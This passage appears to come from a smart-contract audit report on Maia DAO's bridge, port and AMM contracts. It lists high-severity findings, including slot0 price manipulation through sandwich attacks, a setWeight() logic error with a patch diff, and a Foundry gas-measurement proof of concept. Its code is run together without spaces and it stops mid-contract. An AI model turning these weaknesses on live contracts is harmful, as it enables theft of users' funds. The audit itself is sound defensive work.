[H-01] If a STRATEGY TOKEN is “Toggled off” STRATEGIES will still be able to withdraw, but returning of tokens withreplenishReserveswill be disabled.
Submitted byyellowBirdy
Lines of code
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchPort.sol#L158-L169
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchPort.sol#L172-L186
Impact
BranchPort.manageallows a registered Strategy to withdraw certain amounts of enabled strategy tokens. It validates access rights; i.e. if called by a strategy registered for the requested token. However, it doesn’t check to see if the token itself is currently enabled.
Conversely,BranchPort.replenishTokensallows a forced withdrawal of managed tokens from a strategy. However, it performs a check to see if the token is currently an active strategy token.
A strategy token may be disabled bytoggleStrategyToken()even if there are active strategies managing it actively. In such cases, these strategies will still be able to withdraw the tokens with calls tomanage()whilereplenishTokenswill not be callable on them; thus, tokens won’t be forced as returnable.
Recommended Mitigation Steps
Add a check on the enabled strategy token inmanage().ValidategetPortStrategyTokenDebt[_strategy][_token] > 0instead of!isStrategyToken[_token]inreplenishReserves().
Assessed type
Access Control
0xBugsy (Maia) confirmed
0xLightt (Maia) commented:
Addressedhere.

[H-02] Use ofslot0to getsqrtPriceLimitX96can lead to price manipulation.
Submitted byshealtielanz, also found byBreeje,0xStalin,xuwinnie,RED-LOTUS-REACH,0xnev, andkutugu
InRootBrigdeAgent.sol, the functions_gasSwapOutand_gasSwapInuseUniswapV3.slot0to get the value ofsqrtPriceX96, which is used to perform the swap. However, thesqrtPriceX96is pulled fromUniswap.slot0, which is the most recent data point and can be manipulated easily viaMEVbots andFlashloanswith sandwich attacks; which can cause the loss of funds when interacting with theUniswap.swapfunction.
Proof of Concept
You can see the_gasSwapInfunction inRootBrigdeAgent.solhere:
//Get sqrtPriceX96(uint160sqrtPriceX96,,,,,,) =IUniswapV3Pool(poolAddress).slot0();// Calculate Price limit depending on pre-set price impactuint160exactSqrtPriceImpact= (sqrtPriceX96* (priceImpactPercentage/2)) /GLOBAL_DIVISIONER;//Get limituint160sqrtPriceLimitX96=zeroForOneOnInflow?sqrtPriceX96-exactSqrtPriceImpact:sqrtPriceX96+exactSqrtPriceImpact;//Swap imbalanced token as long as we haven't used the entire amountSpecified and haven't reached the price limittryIUniswapV3Pool(poolAddress).swap(address(this),zeroForOneOnInflow,int256(_amount),sqrtPriceLimitX96,abi.encode(SwapCallbackData({tokenIn:gasTokenGlobalAddress}))
You can also see the_gasSwapOutfunction inRootBrigdeAgent.solhere.
(uint160sqrtPriceX96,,,,,,) =IUniswapV3Pool(poolAddress).slot0();// Calculate Price limit depending on pre-set price impactuint160exactSqrtPriceImpact= (sqrtPriceX96* (priceImpactPercentage/2)) /GLOBAL_DIVISIONER;//Get limitsqrtPriceLimitX96=zeroForOneOnInflow?sqrtPriceX96+exactSqrtPriceImpact:sqrtPriceX96-exactSqrtPriceImpact;}//Swap imbalanced token as long as we haven't used the entire amountSpecified and haven't reached the price limit(int256amount0,int256amount1) =IUniswapV3Pool(poolAddress).swap(address(this),!zeroForOneOnInflow,int256(_amount),sqrtPriceLimitX96,abi.encode(SwapCallbackData({tokenIn:address(wrappedNativeToken)})));
These both use the functionsqrtPriceX96pulled fromUniswap.slot0. An attacker can simply manipulate thesqrtPriceX96and if theUniswap.swapfunction is called with thesqrtPriceX96, the token will be bought at a higher price and the attacker would run the transaction to sell; thereby earning gains but causing a loss of funds to whoever called those functions.
Recommended Mitigation Steps
Use theTWAPfunction to get the value ofsqrtPriceX96.
Assessed type
MEV
0xBugsy (Maia) acknowledged, but disagreed with severity
Trust (judge) commented:
Due to a risk of material loss of funds and the only condition for abuse is being able to sandwich a TX, high seems appropriate.
0xBugsy (Maia) confirmed and commented:
We recognize the audit’s findings on Anycall Gas Management. These will not be rectified due to the upcoming migration of this section to LayerZero.

[H-03]setWeight()Logic error
Submitted bybin2chen, also found byUdsen,BPZ, lukejohn (1,2), and ltyu (1,2,3)
Lines of code
https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesPool.sol#L223
Proof of Concept
setWeight()is used to set the new weight. The code is as follows:
functionsetWeight(uint256poolId,uint8weight)externalnonReentrantonlyOwner{if(weight==0)revertInvalidWeight();uint256poolIndex=destinations[poolId];if(poolIndex==0)revertNotUlyssesLP();uint256oldRebalancingFee;for(uint256i=1;i<bandwidthStateList.length;i++) {uint256targetBandwidth=totalSupply.mulDiv(bandwidthStateList[i].weight,totalWeights);oldRebalancingFee+=_calculateRebalancingFee(bandwidthStateList[i].bandwidth,targetBandwidth,false);}uint256oldTotalWeights=totalWeights;uint256weightsWithoutPool=oldTotalWeights-bandwidthStateList[poolIndex].weight;uint256newTotalWeights=weightsWithoutPool+weight;totalWeights=newTotalWeights;if(totalWeights>MAX_TOTAL_WEIGHT||oldTotalWeights==newTotalWeights) {revertInvalidWeight();}uint256leftOverBandwidth;BandwidthStatestoragepoolState=bandwidthStateList[poolIndex];poolState.weight=weight;@>if(oldTotalWeights>newTotalWeights) {for(uint256i=1;i<bandwidthStateList.length;) {if(i!=poolIndex) {uint256oldBandwidth=bandwidthStateList[i].bandwidth;if(oldBandwidth>0) {bandwidthStateList[i].bandwidth=oldBandwidth.mulDivUp(oldTotalWeights,newTotalWeights).toUint248();leftOverBandwidth+=oldBandwidth-bandwidthStateList[i].bandwidth;}}unchecked{++i;}}poolState.bandwidth+=leftOverBandwidth.toUint248();}else{uint256oldBandwidth=poolState.bandwidth;if(oldBandwidth>0) {@>poolState.bandwidth=oldBandwidth.mulDivUp(oldTotalWeights,newTotalWeights).toUint248();leftOverBandwidth+=oldBandwidth-poolState.bandwidth;}for(uint256i=1;i<bandwidthStateList.length;) {if(i!=poolIndex) {if(i==bandwidthStateList.length-1) {@>bandwidthStateList[i].bandwidth+=leftOverBandwidth.toUint248();}elseif(leftOverBandwidth>0) {@>bandwidthStateList[i].bandwidth+=@>leftOverBandwidth.mulDiv(bandwidthStateList[i].weight,weightsWithoutPool).toUint248();}}unchecked{++i;}}}
There are several problems with the above code:
if (oldTotalWeights > newTotalWeights)should be changed toif (oldTotalWeights < newTotalWeights)because the logic inside of theifis to calculate the case of increasingweight.poolState.bandwidth = oldBandwidth.mulDivUp(oldTotalWeights , newTotalWeights).toUint248();should be modified topoolState.bandwidth = oldBandwidth.mulDivUp(newTotalWeights, oldTotalWeights).toUint248();because this calculates with the extra number.leftOverBandwidthhas a problem with the processing logic.
Recommended Mitigation Steps
functionsetWeight(uint256poolId,uint8weight)externalnonReentrantonlyOwner{...-if(oldTotalWeights>newTotalWeights) {+if(oldTotalWeights<newTotalWeights) {for(uint256i=1;i<bandwidthStateList.length;) {if(i!=poolIndex) {uint256oldBandwidth=bandwidthStateList[i].bandwidth;if(oldBandwidth>0) {bandwidthStateList[i].bandwidth=oldBandwidth.mulDivUp(oldTotalWeights,newTotalWeights).toUint248();leftOverBandwidth+=oldBandwidth-bandwidthStateList[i].bandwidth;}}unchecked{++i;}}poolState.bandwidth+=leftOverBandwidth.toUint248();}else{uint256oldBandwidth=poolState.bandwidth;if(oldBandwidth>0) {-poolState.bandwidth=oldBandwidth.mulDivUp(oldTotalWeights,newTotalWeights).toUint248();+poolState.bandwidth=oldBandwidth.mulDivUp(newTotalWeights,oldTotalWeights).toUint248();leftOverBandwidth+=oldBandwidth-poolState.bandwidth;}+uint256currentGiveWidth=0;+uint256currentGiveCount=0;for(uint256i=1;i<bandwidthStateList.length;) {+if(i!=poolIndex) {+if(currentGiveCount==bandwidthStateList.length-2-1) {//last+bandwidthStateList[i].bandwidth+=leftOverBandwidth-currentGiveWidth;+                    }+uint256sharesWidth=leftOverBandwidth.mulDiv(bandwidthStateList[i].weight,weightsWithoutPool).toUint248();+bandwidthStateList[i].bandwidth+=sharesWidth;+currentGiveWidth+=sharesWidth;+currentCount++;+                 }-if(i!=poolIndex) {-if(i==bandwidthStateList.length-1) {-bandwidthStateList[i].bandwidth+=leftOverBandwidth.toUint248();-                    }elseif(leftOverBandwidth>0) {-bandwidthStateList[i].bandwidth+=-leftOverBandwidth.mulDiv(bandwidthStateList[i].weight,weightsWithoutPool).toUint248();-                    }-               }unchecked{++i;}}}...
Assessed type
Context
0xLightt (Maia) confirmed
Trust (judge) increased the severity to High
0xLightt (Maia) commented:
We recognize the audit’s findings on Ulysses AMM. These will not be rectified due to the upcoming migration of this section to Balancer Stable Pools.

[H-04]MIN_FALLBACK_RESERVE(inBranchBridgeAgent) doesn’t consider the actual gas consumption inAnyCallcontracts, which lets the user underpay the actual cost when replenishing the execution budget
Submitted byKoolex
anyFallbackmethod is called by theAnycall Executoron the source chain in case of a failure of the functionanyExecuteon the root chain. The user has to pay for the execution gas cost for this, which is done at the end of the call. However, if there is not enoughdepositedGas, theanyFallbackmethod will be reverted, due to a revert caused by theAnycall Executor. This shouldn’t happen since the depositor deposited at least theMIN_FALLBACK_RESERVE(185_000) in the first place.
Here is the calculation for the gas used whenanyFallbackis called:
//Save gasuint256gasLeft=gasleft();//Get Branch Environment Execution Costuint256minExecCost=tx.gasprice* (MIN_FALLBACK_RESERVE+_initialGas-gasLeft);//Check if sufficient balanceif(minExecCost>getDeposit[_depositNonce].depositedGas) {_forceRevert();return;}
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1063-L1072
_forceRevertwill withdraw all of the execution budget:
// Withdraw all execution gas budget from anycall for tx to revert with "no enough budget"if (executionBudget > 0) try anycallConfig.withdraw(executionBudget) {} catch {}
SoAnycall Executorwill revert if there is not enough budget. This is done at:
uint256budget=executionBudget[_from];require(budget>totalCost,"no enough budget");executionBudget[_from] =budget-totalCost;
https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L206C42-L206C58
(1) Gas Calculation in ouranyFallbackand inAnyCallcontracts:
To calculate how much the user has to pay, the following formula is used:
//Get Branch Environment Execution Costuint256minExecCost=tx.gasprice* (MIN_FALLBACK_RESERVE+_initialGas-gasLeft);
Gas units are calculated as follows:
Storegasleft()atinitialGasat the beginning ofanyFallbackmethod:
//Get Initial Gas Checkpointuint256initialGas=gasleft();
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1233-L1234
Nearly at the end of the method, deductgasleft()frominitialGas. This covers everything between the initial gas checkpoint and the ending gas checkpoint.
//Save gasuint256gasLeft=gasleft();//Get Branch Environment Execution Costuint256minExecCost=tx.gasprice* (MIN_FALLBACK_RESERVE+_initialGas-gasLeft);
https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1063-L1066
AddMIN_FALLBACK_RESERVEwhich is185_000.
This overhead is supposed to cover:
100_000foranycall. This is extra cost required byAnycall.
Line:38uint256constantEXECUTION_OVERHEAD=100000;..Line:203uint256gasUsed=_prevGasLeft+EXECUTION_OVERHEAD-gasleft();
https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L203
85_000for our fallback execution. For example, this is used to cover the modifierrequiresExecutorand to cover everything after the end gas checkpoint.
If we check how much this would actually cost,we can find it nearly70_000. So,85_000is safe enough. A PoC is also provided to prove this. However, there is an overhead of gas usage in theAnycallcontracts that’s not considered, which is different than the100_000extra that’s required byAnyCallanyway (see above).
This means, the user is paying less than the actual cost. According to the sponsor, Bridge Agent deployer deposits the first time intoanycallConfig, where the goal is to replenish the execution budget after use every time.
The issue leads to:
execution budget is decreasing over time (slow draining)in case it has funds already.anyExecute call will failsince the calculation of the gas used in theAnycallcontracts is bigger than the minimum reserve. InAnycall, this is done by the modifierchargeDestFee.ModifierchargeDestFee:modifierchargeDestFee(address_from,uint256_flags) {if(_isSet(_flags,AnycallFlags.FLAG_PAY_FEE_ON_DEST)) {uint256_prevGasLeft=gasleft();_;IAnycallConfig(config).chargeFeeOnDestChain(_from,_prevGasLeft);}else{_;}}https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Upgradeable.sol#L163-L171FunctionchargeFeeOnDestChain:functionchargeFeeOnDestChain(address_from,uint256_prevGasLeft)externalonlyAnycallContract{if(!_isSet(mode,FREE_MODE)) {uint256gasUsed=_prevGasLeft+EXECUTION_OVERHEAD-gasleft();uint256totalCost=gasUsed* (tx.gasprice+_feeData.premium);uint256budget=executionBudget[_from];require(budget>totalCost,"no enough budget");executionBudget[_from] =budget-totalCost;_feeData.accruedFees+=uint128(totalCost);}}https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Config.sol#L203
The gas consumption ofanyExecmethod called by the MPC (inAnyCall) here:
functionanyExec(address_to,bytescalldata_data,stringcalldata_appID,RequestContextcalldata_ctx,bytescalldata_extdata)externalvirtuallockwhenNotPausedchargeDestFee(_to, _ctx.flags)// <= starting from hereonlyMPC{...boolsuccess=_execute(_to,_data,_ctx,_extdata);..}
https://github.com/anyswap/multichain-smart-contracts/blob/main/contracts/anycall/v7/AnycallV7Upgradeable.sol#L276
The gas is nearly110_000and is not taken into account; as proven in the PoCs.
(2) Base Fee & Input Data Fee:
FromEthereum yellow paper:
Gtransaction- 21000 Paid for every transaction.Gtxdatazero- 4 Paid for every zero byte of data or code for a transaction.Gtxdatanonzero- 16 Paid for every non-zero byte of data or code for a transaction.
So:
We have21_000as the base fee. This should be taken into account; however, it is paid byAnyCallsince the TX is sent by MPC. So, we are fine here. This probably explains the overhead (100_000) added byanycall.Because theanyFallbackmethod has bytes data to be passed, we have extra gas consumption which is not taken into account.
For every zero byte=>4
For every non-zero byte=>16
So generally speaking, the bigger the data is, the bigger the gas becomes. You can simply prove this by adding arbitrary data to theanyFallbackmethod in the PoC #1 test below. You will also see the gas spent increases.
Summary
MIN_FALLBACK_RESERVEis safe enough, without considering theanyExecmethod (check next point).The gas consumed by theanyExecmethod called by the MPC is not considered.The input data fee isn’t taken into account.
There are two PoCs proving the first two points above. The third point can be proven by simply adding arbitrary data to theanyFallbackmethod in the PoC #1 test.
Note: this is also applicable forRootBridgeAgent, which I avoided writing a separate issue for it since the code for_payFallbackGasis almost the same. However, those 3 statements don’t exist inRootBridgeAgent._payFallbackGas.
//Withdraw GasIPort(localPortAddress).withdraw(address(this),address(wrappedNativeToken),minExecCost);//Unwrap GaswrappedNativeToken.withdraw(minExecCost);//Replenish Gas_replenishGas(minExecCost);
So, the gas spent is even less and55_000(from155_000inMIN_FALLBACK_RESERVEofRootBridgeAgent) is safe enough. But, the second two points are still not taken into account inRootBridgeAgent(see above).
Proof of Concept #1
MIN_FALLBACK_RESERVEis safe enough.
Note: estimation doesn’t consideranyExecmethod’s actual cost.
Overview
This PoC is independent from the codebase (but uses the same code). There are two contracts simulatingBranchBridgeAgent.anyFallback:
BranchBridgeAgent, which has the code of the pre-first gas checkpoint and the post-last gas checkpoint.BranchBridgeAgentEmpty, which has the code of the pre-first gas checkpoint and the post-last gas checkpointcommented out.
We’ll run the same test for both, but the difference in gas is what’s at least nearly the minimum required to cover the pre-first gas checkpoint and the post-last gas checkpoint.
In this case here, it is70_090which is smaller than85_000. So, we are fine.
Here is the output of the test:
[PASS]test_calcgas() (gas: 143835)Logs:branchBridgeAgent.anyFallback Gas Spent => 71993[PASS]test_calcgasEmpty() (gas: 73734)Logs:branchBridgeAgentEmpty.anyFallback Gas Spent => 1903Test result: ok. 2 passed; 0 failed; finishedin2.08ms
71_993 - 1903=70_090
Explanation
BranchBridgeAgent.anyFallbackmethod depends on the following external calls:
AnycallExecutor.context()AnycallProxy.config()AnycallConfig.executionBudget()AnycallConfig.withdraw()AnycallConfig.deposit()WETH9.withdraw()BranchPort.withdraw()
For this reason, I’ve copied the same code frommultichain-smart-contracts. ForWETH9, I’ve used the contract from the codebase which has minimal code. ForBranchPort, I copied from the codebase.
Note: For libraries, unused methods were removed. This is because I couldn’t submit the report, as it gave the error “too long body”. However, it doesn’t affect the gas spent
Please note that:
tx.gaspriceis replaced with a fixed value in the_payFallbackGasmethod, as it is not available in Foundry.In_replenishGas, reading the config viaIAnycallProxy(localAnyCallAddress).config()is replaced with animmediatecall for simplicity. In other words, avoiding proxy to make the PoC simpler and shorter. However, if done with proxy, the gas used would increase. So in both ways, it is in favor of the PoC.
The coded PoC
Foundry.toml
[profile.default]solc ='0.8.17'src ='solidity'test='solidity/test'out ='out'libs = ['lib']fuzz_runs = 1000optimizer_runs = 10_000
.gitmodules
[submodule"lib/ds-test"]path = lib/ds-testurl = https://github.com/dapphub/ds-testbranch = master[submodule"lib/forge-std"]path = lib/forge-stdurl = https://github.com/brockelmore/forge-stdbranch = master
remappings.txt
ds-test/=lib/ds-test/srcforge-std/=lib/forge-std/src
Test File:
// PoC => Maia OmniChain: gasCalculation for anyFallback in BranchBridgeAgentpragmasolidity>=0.8.4<0.9.0;import{Test}from"forge-std/Test.sol";import"forge-std/console.sol";import{DSTest}from"ds-test/test.sol";// copied from https://github.com/transmissions11/solmate/blob/main/src/tokens/ERC20.sol// only decimals is usedabstractcontractERC20{stringpublicname;stringpublicsymbol;uint8publicimmutabledecimals;constructor(stringmemory_name,stringmemory_symbol,uint8_decimals) {name=_name;symbol=_symbol;decimals=_decimals;}}// copied from Solady// removed unused methods, because I couldn't submit the report with too long codelibrarySafeTransferLib{/// @dev The ETH transfer has failed.errorETHTransferFailed();/// @dev The ERC20 `transferFrom` has failed.errorTransferFromFailed();/// @dev The ERC20 `transfer` has failed.errorTransferFailed();/// @dev The ERC20 `approve` has failed.errorApproveFailed();/// @dev Suggested gas stipend for contract receiving ETH/// that disallows any storage writes.uint256internalconstant_GAS_STIPEND_NO_STORAGE_WRITES=2300;/// @dev Suggested gas stipend for contract receiving ETH to perform a few/// storage reads and writes, but low enough to prevent griefing./// Multiply by a small constant (e.g. 2), if needed.uint256internalconstant_GAS_STIPEND_NO_GRIEF=100000;/// @dev Sends `amount` (in wei) ETH to `to`./// Reverts upon failure.////// Note: This implementation does NOT protect against gas griefing./// Please use `forceSafeTransferETH` for gas griefing protection.functionsafeTransferETH(addressto,uint256amount)internal{/// @solidity memory-safe-assemblyassembly{// Transfer the ETH and check if it succeeded or not.ifiszero(call(gas(),to,amount,0,0,0,0)) {// Store the function selector of `ETHTransferFailed()`.mstore(0x00,0xb12d13eb)// Revert with (offset, size).revert(0x1c,0x04)}}}functionsafeTransferFrom(addresstoken,addressfrom,addressto,uint256amount)internal{/// @solidity memory-safe-assemblyassembly{letm:=mload(0x40)// Cache the free memory pointer.mstore(0x60,amount)// Store the `amount` argument.mstore(0x40,to)// Store the `to` argument.mstore(0x2c,shl(96,from))// Store the `from` argument.// Store the function selector of `transferFrom(address,address,uint256)`.mstore(0x0c,0x23b872dd000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x1c,0x64,0x00,0x20))) {// Store the function selector of `TransferFromFailed()`.mstore(0x00,0x7939f424)// Revert with (offset, size).revert(0x1c,0x04)}mstore(0x60,0)// Restore the zero slot to zero.mstore(0x40,m)// Restore the free memory pointer.}}/// @dev Sends `amount` of ERC20 `token` from the current contract to `to`./// Reverts upon failure.functionsafeTransfer(addresstoken,addressto,uint256amount)internal{/// @solidity memory-safe-assemblyassembly{mstore(0x14,to)// Store the `to` argument.mstore(0x34,amount)// Store the `amount` argument.// Store the function selector of `transfer(address,uint256)`.mstore(0x00,0xa9059cbb000000000000000000000000)ifiszero(and(// The arguments of `and` are evaluated from right to left.// Set success to whether the call reverted, if not we check it either// returned exactly 1 (can't just be non-zero data), or had no return data.or(eq(mload(0x00),1),iszero(returndatasize())),call(gas(),token,0,0x10,0x44,0x00,0x20))) {// Store the function selector of `TransferFailed()`.mstore(0x00,0x90b8ec18)// Revert with (offset, size).revert(0x1c,0x04)}// Restore the part of the free memory pointer that was overwritten.mstore(0x34,0)}}}/// copied from (https://github.com/vectorized/solady/blob/main/src/utils/SafeCastLib.sol)librarySafeCastLib{errorOverflow();functiontoUint128(uint256x)internalpurereturns(uint128) {if(x>=1<<128)_revertOverflow();returnuint128(x);}functiontoInt8(int256x)internalpurereturns(int8) {int8y=int8(x);if(x!=y)_revertOverflow();returny;}functiontoInt128(int256x)internalpurereturns(int128) {int128y=int128(x);if(x!=y)_revertOverflow();returny;}functiontoInt256(uint256x)internalpurereturns(int256) {if(x>=1<<255)_revertOverflow();returnint256(x);}/*Â´:Â°â€¢.Â°+.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°â€¢.*â€¢Â´.*:Ëš.Â°*.Ëšâ€¢Â´.Â°:Â°â€¢.Â°+.*â€¢Â´.*:*//-                    PRIVATE HELPERS*//*.â€¢Â°:Â°.Â´+Ëš.*Â°.Ëš:*.Â´â€¢*.+Â°.â€¢Â°:Â´*.Â´â€¢*.â€¢Â°.â€¢Â°:Â°.Â´:â€¢ËšÂ°.*Â°.Ëš:*.Â´+Â°.â€¢*/function_revertOverflow()privatepure{/// @solidity memory-safe-assemblyassembly{// Store the function selector of `Overflow()`.mstore(0x00,0x35278d12)// Revert with (offset, size).revert(0x1c,0x04)}}}interfaceIAnycallExecutor{functioncontext()externalviewreturns(addressfrom,uint256fromChainID,uint256nonce);functionexecute(address_to,bytescalldata_data,address_from,uint256_fromChainID,uint256_nonce,uint256_flags,bytescalldata_extdata)externalreturns(boolsuccess,bytesmemoryresult);}interfaceIAnycallConfig{functioncalcSrcFees(address_app,uint256_toChainID,uint256_dataLength)externalviewreturns(uint256);functionexecutionBudget(address_app)externalviewreturns(uint256);functiondeposit(address_account)externalpayable;functionwithdraw(uint256_amount)external;}interfaceIAnycallProxy{functionexecutor()externalviewreturns(address);functionconfig()externalviewreturns(address);functionanyCall(address_to,bytescalldata_data,uint256_toChainID,uint256_flags,bytescalldata_extdata)externalpayable;functionanyCall(stringcalldata_to,bytescalldata_data,uint256_toChainID,uint256_flags,bytescalldata_extdata)externalpayable;}contractWETH9{stringpublicname="Wrapped Ether";stringpublicsymbol="WETH";uint8publicdecimals=18;eventApproval(addressindexedsrc,addressindexedguy,uint256wad);eventTransfer(addressindexedsrc,addressindexeddst,uint256wad);eventDeposit(addressindexeddst,uint256wad);eventWithdrawal(addressindexedsrc,uint256wad);mapping(address=>uint256)publicbalanceOf;mapping(address=>mapping(address=>uint256))publicallowance;// function receive() external payable {//   deposit();// }functiondeposit()publicpayable{balanceOf[msg.sender] +=msg.value;emitDeposit(msg.sender,msg.value);}functionwithdraw(uint256wad)public{require(balanceOf[msg.sender] >=wad);balanceOf[msg.sender] -=wad;payable(msg.sender).transfer(wad);emitWithdrawal(msg.sender,wad);}functiontotalSupply()publicviewreturns(uint256) {returnaddress(this).balance;}functionapprove(addressguy,uint256wad)publicreturns(bool) {allowance[msg.sender][guy] =wad;emitApproval(msg.sender,guy,wad);returntrue;}functiontransfer(addressdst,uint256wad)publicreturns(bool) {returntransferFrom(msg.sender,dst,wad);}functiontransferFrom(addresssrc,addressdst,uint256wad)publicreturns(bool) {require(balanceOf[src] >=wad);if(src!=msg.sender&&allowance[src][msg.sender] !=255) {require(allowance[src][msg.sender] >=wad);allowance[src][msg.sender] -=wad;}balanceOf[src] -=wad;balanceOf[dst] +=wad;emitTransfer(src,dst,wad);returntrue;}}contractAnycallExecutor{structContext{addressfrom;uint256fromChainID;uint256nonce;}// Context public override context;Contextpubliccontext;constructor() {context.fromChainID=1;context.from=address(2);context.nonce=1;}}contractAnycallV7Config{eventDeposit(addressindexedaccount,uint256amount);mapping(address=>uint256)publicexecutionBudget;/// @notice Deposit native currency crediting `_account` for execution costs on this chain/// @param _account The account to deposit and credit forfunctiondeposit(address_account)externalpayable{executionBudget[_account] +=msg.value;emitDeposit(_account,msg.value);}}// IBranchPort interfaceinterfaceIPort{/*///////////////////////////////////////////////////////////////VIEW FUNCTIONS//////////////////////////////////////////////////////////////*//***@noticeReturns true if the address is a Bridge Agent.-@param_bridgeAgentBridge Agent address.-@returnbool.*/functionisBridgeAgent(address_bridgeAgent)externalviewreturns(bool);/***@noticeReturns true if the address is a Strategy Token.-@param_tokentoken address.-@returnbool.*/functionisStrategyToken(address_token)externalviewreturns(bool);/***@noticeReturns true if the address is a Port Strategy.-@param_strategystrategy address.-@param_tokentoken address.-@returnbool.*/functionisPortStrategy(address_strategy,address_token)externalviewreturns(bool);/***@noticeReturns true if the address is a Bridge Agent Factory.-@param_bridgeAgentFactoryBridge Agent Factory address.-@returnbool.*/functionisBridgeAgentFactory(address_bridgeAgentFactory)externalviewreturns(bool);/*///////////////////////////////////////////////////////////////PORT STRATEGY MANAGEMENT//////////////////////////////////////////////////////////////*//***@noticeAllows active Port Strategy addresses to withdraw assets.-@param_tokentoken address.-@param_amountamount of tokens.*/functionmanage(address_token,uint256_amount)external;/***@noticeallow approved address to repay borrowed reserves with reserves-@param_amountuint-@param_tokenaddress*/functionreplenishReserves(address_strategy,address_token,uint256_amount)external;/*///////////////////////////////////////////////////////////////hTOKEN MANAGEMENT//////////////////////////////////////////////////////////////*//***@noticeFunction to withdraw underlying / native token amount into Port in exchange for Local hToken.-@param_recipienthToken receiver.-@param_underlyingAddressunderlying / native token address.-@param_amountamount of tokens.**/functionwithdraw(address_recipient,address_underlyingAddress,uint256_amount)external;/***@noticeSetter function to increase local hToken supply.-@param_recipienthToken receiver.-@param_localAddresstoken address.-@param_amountamount of tokens.**/functionbridgeIn(address_recipient,address_localAddress,uint256_amount)external;/***@noticeSetter function to increase local hToken supply.-@param_recipienthToken receiver.-@param_localAddressestoken addresses.-@param_amountsamount of tokens.**/functionbridgeInMultiple(address_recipient,address[]memory_localAddresses,uint256[]memory_amounts)external;/***@noticeSetter function to decrease local hToken supply.-@param_localAddresstoken address.-@param_amountamount of tokens.**/functionbridgeOut(address_depositor,address_localAddress,address_underlyingAddress,uint256_amount,uint256_deposit)external;/***@noticeSetter function to decrease local hToken supply.-@param_depositoruser to deduct balance from.-@param_localAddresseslocal token addresses.-@param_underlyingAddresseslocal token address.-@param_amountsamount of local tokens.-@param_depositsamount of underlying tokens.**/functionbridgeOutMultiple(address_depositor,address[]memory_localAddresses,address[]memory_underlyingAddresses,uint256[]memory_amounts,uint256[]memory_deposits)external;/*///////////////////////////////////////////////////////////////ADMIN FUNCTIONS//////////////////////////////////////////////////////////////*//***@noticeAdds a new bridge agent address to the branch port.-@param_bridgeAgentaddress of the bridge agent to add to the Port*/functionaddBridgeAgent(address_bridgeAgent)external;/***@noticeSets the core router address for the branch port.-@param_newCoreRouteraddress of the new core router*/functionsetCoreRouter(address_newCoreRouter)external;/***@noticeAdds a new bridge agent factory address to the branch port.-@param_bridgeAgentFactoryaddress of the bridge agent factory to add to the Port*/functionaddBridgeAgentFactory(address_bridgeAgentFactory)external;/***@noticeReverts the toggle on the given bridge agent factory. If it's active, it will de-activate it and vice-versa.-@param_newBridgeAgentFactoryaddress of the bridge agent factory to add to the Port*/functiontoggleBridgeAgentFactory(address_newBridgeAgentFactory)external;/***@noticeReverts thfe toggle on the given bridge agent  If it's active, it will de-activate it and vice-versa.-@param_bridgeAgentaddress of the bridge agent to add to the Port*/functiontoggleBridgeAgent(address_bridgeAgent)external;/***@noticeAdds a new strategy token.*@param_tokenaddress of the token to add to the Strategy Tokens*/functionaddStrategyToken(address_token,uint256_minimumReservesRatio)external;/***@noticeReverts the toggle on the given strategy token. If it's active, it will de-activate it and vice-versa.*@param_tokenaddress of the token to add to the Strategy Tokens*/functiontoggleStrategyToken(address_token)external;/***@noticeAdds a new Port strategy to the given port*@param_portStrategyaddress of the bridge agent factory to add to the Port*/functionaddPortStrategy(address_portStrategy,address_token,uint256_dailyManagementLimit)external;/***@noticeReverts the toggle on the given port strategy. If it's active, it will de-activate it and vice-versa.*@param_portStrategyaddress of the bridge agent factory to add to the Port*/functiontogglePortStrategy(address_portStrategy,address_token)external;/***@noticeUpdates the daily management limit for the given port strategy.*@param_portStrategyaddress of the bridge agent factory to add to the Port*@param_tokenaddress of the token to update the limit for*@param_dailyManagementLimitnew daily management limit*/functionupdatePortStrategy(address_portStrategy,address_token,uint256_dailyManagementLimit)external;/*///////////////////////////////////////////////////////////////EVENTS//////////////////////////////////////////////////////////////*/eventDebtCreated(addressindexed_strategy,addressindexed_token,uint256_amount);eventDebtRepaid(addressindexed_strategy,addressindexed_token,uint256_amount);eventStrategyTokenAdded(addressindexed_token,uint256_minimumReservesRatio);eventStrategyTokenToggled(addressindexed_token);eventPortStrategyAdded(addressindexed_portStrategy,addressindexed_token,uint256_dailyManagementLimit);eventPortStrategyToggled(addressindexed_portStrategy,addressindexed_token);eventPortStrategyUpdated(addressindexed_portStrategy,addressindexed_token,uint256_dailyManagementLimit);eventBridgeAgentFactoryAdded(addressindexed_bridgeAgentFactory);eventBridgeAgentFactoryToggled(addressindexed_bridgeAgentFactory);eventBridgeAgentToggled(addressindexed_bridgeAgent);/*///////////////////////////////////////////////////////////////ERRORS//////////////////////////////////////////////////////////////*/errorInvalidMinimumReservesRatio();errorInsufficientReserves();errorUnrecognizedCore();errorUnrecognizedBridgeAgent();errorUnrecognizedBridgeAgentFactory();errorUnrecognizedPortStrategy();errorUnrecognizedStrategyToken();}contractBranchPort{usingSafeTransferLibforaddress;errorUnrecognizedBridgeAgent();/// @notice Mapping from Underlying Address to isUnderlying (bool).mapping(address=>bool)publicisBridgeAgent;constructor(addressbridgeAgent) {isBridgeAgent[bridgeAgent] =true;}/// @notice Modifier that verifies msg sender is an active Bridge 